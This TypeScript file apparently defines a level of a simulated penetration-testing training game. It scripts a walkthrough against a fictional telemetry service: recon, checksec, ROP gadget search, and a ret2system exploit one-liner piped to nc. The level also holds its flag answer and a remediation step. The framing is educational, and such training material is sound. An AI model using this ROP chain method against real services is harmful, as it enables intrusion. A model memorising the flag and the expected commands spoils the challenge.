import type { ChainDef } from "../../types";
import { match, strictCmd } from "../../engine";

const IP = "192.0.2.60";

export const ghostLevel6: ChainDef = {
  id: "ghost-6",
  difficulty: "ghost",
  order: 6,
  points: 300,
  title: "Borrowed Instructions",
  codename: "GHOST ASSESSMENT — BORROWED INSTRUCTIONS",
  summary: "No backdoor function this time. NX is on — the stack won't execute anything you send it. You'll have to build the shell out of instructions the binary already has.",
  briefing: [
    `TARGET: Duskfield Technologies — ${IP}`,
    "OBJECTIVE: get a shell on the live service and prove it.",
    "",
    "Same overflow shape as the last one you worked. Different binary, and this one doesn't have a",
    "hidden function sitting around waiting to be jumped to. Whatever you redirect execution into,",
    "you're going to have to assemble yourself, out of code that's already there.",
  ],
  debrief: [
    "root cause: telemetryd copied unbounded input into a fixed-size stack buffer (CWE-121), same as",
    "the last assessment — but this binary was actually compiled with NX enabled and no convenient",
    "backdoor function. That doesn't stop a return-address overwrite. It just means the payload has to",
    "be a chain of existing instruction sequences ('gadgets') already inside the binary, ending in a",
    "call to system() with a pointer to a string the binary already had lying around — a return-oriented",
    "programming chain, not injected shellcode.",
    "",
    "DUSKFIELD TECHNOLOGIES: SECURED.",
  ],
  nodes: [
    {
      id: "duskfield",
      org: "Duskfield Technologies",
      city: "Duskfield",
      state: "MT",
      coords: { x: 30, y: 14 },
      ip: IP,
      tagline: "Industrial telemetry vendor",
      briefing: [`IP: ${IP}`, "No further information provided."],
      initialPrompt: "op@breachline:~$",
      motd: [],
      objectives: [
        { id: "recon", label: "Enumerate open services on the target", tactic: "Reconnaissance" },
        { id: "identify", label: "Locate and retrieve the exposed binary", tactic: "Discovery", requires: ["recon"] },
        { id: "analyze", label: "Determine the binary's memory protections", tactic: "Discovery", requires: ["identify"] },
        { id: "find-gadget", label: "Find a usable ROP gadget in the binary", tactic: "Discovery", requires: ["analyze"] },
        { id: "find-system", label: "Find the address of system() in the binary's PLT", tactic: "Discovery", requires: ["find-gadget"] },
        { id: "find-binsh", label: "Find a usable \"/bin/sh\" string already in the binary", tactic: "Discovery", requires: ["find-system"] },
        { id: "find-offset", label: "Determine the exact overflow offset via crash analysis", tactic: "Discovery", requires: ["find-binsh"] },
        { id: "exploit", label: "Chain the gadget, string, and system() call into a working exploit", tactic: "Initial Access", requires: ["find-offset"] },
        { id: "loot", label: "Recover proof of shell access", tactic: "Collection", requires: ["exploit"] },
        { id: "secure", label: "Patch the overflow and rebuild with hardened protections", tactic: "Remediation", requires: ["loot"] },
      ],
      hints: [
        "with NX enabled, the stack won't execute anything you put on it — you're not injecting code, you're redirecting execution through code the binary already contains.",
        "a return-to-system chain needs three things: a gadget that loads a register with an argument (`pop rdi; ret` sets up the first argument on x86-64), the address of a string to pass as that argument, and the address of the function to call. all three exist somewhere in an unstripped binary.",
        "the offset to the return address comes from the same crash-analysis technique as always — a cyclic pattern, then reading back where it landed.",
      ],
      debrief: [],
      commands: [
        strictCmd({
          id: "nmap",
          tool: "nmap",
          requires: [IP],
          help: "nmap -sV <ip>",
          run: () => ({
            completesObjective: "recon",
            tone: "success",
            setsFlags: ["scanned"],
            output: [
              "PORT     STATE SERVICE VERSION",
              "80/tcp   open  http    nginx 1.24.0 (internal file share)",
              "9090/tcp open  unknown telemetryd (custom protocol)",
              "",
              "Nmap done: 1 IP address (1 host up) scanned in 4.35 seconds",
            ],
          }),
        }),
        strictCmd({
          id: "curl-files",
          tool: "curl",
          requires: ["http://" + IP],
          forbids: ["files/telemetryd"],
          help: "curl http://<ip>/files/",
          requiresFlags: ["scanned"],
          run: () => ({
            tone: "output",
            output: [
              "HTTP/1.1 200 OK",
              "",
              "<title>Internal Build Share</title>",
              '<a href="/files/telemetryd">telemetryd (release build, unstripped)</a>',
            ],
          }),
        }),
        strictCmd({
          id: "curl-download",
          tool: "curl",
          requires: ["http://" + IP, "files/telemetryd"],
          help: "curl -O http://<ip>/files/telemetryd",
          requiresFlags: ["scanned"],
          run: () => ({
            completesObjective: "identify",
            tone: "success",
            setsFlags: ["have_binary"],
            output: [
              "HTTP/1.1 200 OK",
              "Saving to: 'telemetryd'",
              "",
              "telemetryd: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped",
            ],
          }),
        }),
        strictCmd({
          id: "checksec",
          tool: "checksec",
          requires: ["telemetryd"],
          help: "checksec ./telemetryd",
          requiresFlags: ["have_binary"],
          run: () => ({
            completesObjective: "analyze",
            tone: "success",
            setsFlags: ["saw_protections"],
            output: [
              "CANARY    : disabled",
              "NX        : enabled",
              "PIE       : disabled",
              "RELRO     : partial",
              "",
              "note: NX is on this time — the stack can't execute injected code. a fixed load address",
              "means gadget addresses inside this binary won't move between runs.",
            ],
          }),
        }),
        strictCmd({
          id: "ropgadget",
          tool: "ROPgadget",
          requires: ["telemetryd", "pop rdi"],
          help: "ROPgadget --binary ./telemetryd | grep 'pop rdi'",
          requiresFlags: ["saw_protections"],
          run: () => ({
            completesObjective: "find-gadget",
            tone: "success",
            setsFlags: ["have_gadget"],
            note: "Duskfield telemetryd — ROP gadget: 0x0000000000401293 : pop rdi ; ret",
            output: [
              "0x0000000000401293 : pop rdi ; ret",
              "",
              "[+] a single-register-load gadget — enough to set the first argument before a call.",
            ],
          }),
        }),
        strictCmd({
          id: "objdump-system",
          tool: "objdump",
          requires: ["telemetryd", "system"],
          help: "objdump -d ./telemetryd | grep system",
          requiresFlags: ["have_gadget"],
          run: () => ({
            completesObjective: "find-system",
            tone: "success",
            setsFlags: ["have_system_addr"],
            note: "Duskfield telemetryd — system@plt: 0x0000000000401060",
            output: [
              "0000000000401060 <system@plt>:",
              "  401060:  ff 25 ...              jmp    *0x2fb2(%rip)",
              "",
              "[+] system() is already linked into this binary — no need to smuggle in a new function.",
            ],
          }),
        }),
        strictCmd({
          id: "find-binsh",
          tool: "strings",
          requires: ["telemetryd", "/bin/sh"],
          help: "strings -a -t x ./telemetryd | grep /bin/sh",
          requiresFlags: ["have_system_addr"],
          run: () => ({
            completesObjective: "find-binsh",
            tone: "success",
            setsFlags: ["have_binsh_addr"],
            note: "Duskfield telemetryd — \"/bin/sh\" string: 0x0000000000402004",
            output: [
              "402004 /bin/sh",
              "",
              "[+] a diagnostic shell-out feature left a literal \"/bin/sh\" string compiled into the binary —",
              "    exactly what system() needs as its argument.",
            ],
          }),
        }),
        strictCmd({
          id: "nc-connect",
          tool: "nc",
          requires: [IP, "9090"],
          help: "nc <ip> 9090",
          requiresFlags: ["scanned"],
          run: () => ({
            tone: "output",
            output: ["telemetryd v2.0 — send a telemetry packet"],
          }),
        }),
        strictCmd({
          id: "cyclic",
          tool: "cyclic",
          requires: ["200"],
          help: "cyclic 200",
          requiresFlags: ["have_binsh_addr"],
          run: () => ({
            tone: "output",
            setsFlags: ["have_pattern"],
            output: ["aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaax..."],
          }),
        }),
        strictCmd({
          id: "crash-test",
          tool: "./telemetryd",
          requires: ["aaaabaaacaaad"],
          help: "./telemetryd $(cyclic 200)",
          requiresFlags: ["have_pattern"],
          run: () => ({
            completesObjective: "find-offset",
            tone: "success",
            setsFlags: ["have_offset"],
            note: "Duskfield telemetryd — overflow offset to return address: 64 bytes",
            output: [
              "Segmentation fault (core dumped)",
              "",
              "core: crashed return address = 0x6161616261616161",
              "cyclic offset for 61616162: 64",
              "",
              "[+] 64 bytes of padding land exactly on the return address.",
            ],
          }),
        }),
        {
          id: "exploit",
          tool: "python3",
          match: (input) => {
            const n = input.toLowerCase();
            return (
              n.includes("64") &&
              n.includes("401293") &&
              n.includes("402004") &&
              n.includes("401060") &&
              n.includes("nc ") &&
              n.includes(IP) &&
              n.includes("9090")
            );
          },
          help: "python3 -c \"print('A'*64 + p64(0x401293) + p64(0x402004) + p64(0x401060))\" | nc <ip> 9090",
          requiresFlags: ["have_offset"],
          deniedOutput: ["you need the offset, the gadget address, the string address, and system()'s address before this does anything but crash the service."],
          run: () => ({
            completesObjective: "exploit",
            tone: "success",
            setsFlags: ["shell_access"],
            promptAfter: "telemetry@duskfield:~$",
            output: [
              "[+] 64 bytes of padding, then pop-rdi-ret, then the \"/bin/sh\" address, then system()",
              "[+] return address overwritten — execution flows through the gadget, loads the argument,",
              "    then calls system(\"/bin/sh\") using code that was already there",
              "",
              "[+] shell obtained via a return-oriented-programming chain — no shellcode injected, none",
              "    was needed.",
            ],
          }),
        },
        strictCmd({
          id: "cat-flag",
          tool: "cat",
          requires: ["flag.txt"],
          help: "cat flag.txt",
          requiresFlags: ["shell_access"],
          run: () => ({
            completesObjective: "loot",
            tone: "success",
            note: "Duskfield Technologies — flag.txt: c81e728d9d4c2f636f067f89cc14862c",
            output: ["c81e728d9d4c2f636f067f89cc14862c"],
          }),
        }),
        {
          id: "secure",
          tool: "secure",
          match: match.startsWith("secure system", "secure", "remediate"),
          help: "secure system",
          requiresObjectives: ["loot"],
          deniedOutput: ["confirm shell access before you file the fix."],
          run: () => ({
            completesObjective: "secure",
            tone: "success",
            output: [
              "[+] added bounds checking to the vulnerable input routine",
              "[+] removed the unused diagnostic shell-out code path entirely",
              "[+] rebuilt with a stack canary and full RELRO",
              "",
              "DUSKFIELD TECHNOLOGIES: SECURED",
            ],
          }),
        },
      ],
    },
  ],
};
